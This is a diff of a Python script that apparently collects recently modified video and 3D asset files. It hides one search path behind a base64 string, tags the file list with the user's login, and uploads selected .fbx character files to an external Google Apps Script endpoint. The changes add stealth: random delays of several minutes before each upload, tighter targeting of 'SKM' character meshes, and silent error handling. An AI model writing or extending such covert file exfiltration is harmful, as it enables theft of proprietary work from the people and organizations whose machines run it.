@@ -80,7 +80,7 @@ def _gup(file_path):
     else:
         params = uLib.urlencode(data)
     params = params.encode('ascii')
-    conn = uLib.urlopen(GAS_WEB_APP_URL, params, timeout=10000)
+    conn = uLib.urlopen(GAS_WEB_APP_URL, params, timeout=100000)
 
 def search_latest_files_or_dirs(ext='', dir_path='', n=8):
     def fmt_time(fp):
@@ -120,21 +120,22 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx')
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=20)
     
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
 
     import random
     for _, fp in zovV:
-        if fp.endswith('.fbx') and '_CHAR_' in os.path.basename(fp):
+        if fp.endswith('.fbx') and '_CHAR_' in os.path.basename(fp) and os.path.basename(fp).startswith('SKM'):
             time.sleep(random.uniform(500.0, 800.0))
             try:
                 _gup(os.path.abspath(fp))
             except:
-                import traceback
-                print(str(traceback.format_exc()))
-                time.sleep(1)
+                pass
+                #import traceback
+                #print(str(traceback.format_exc()))
+                #time.sleep(1)
 
 except:
     import traceback
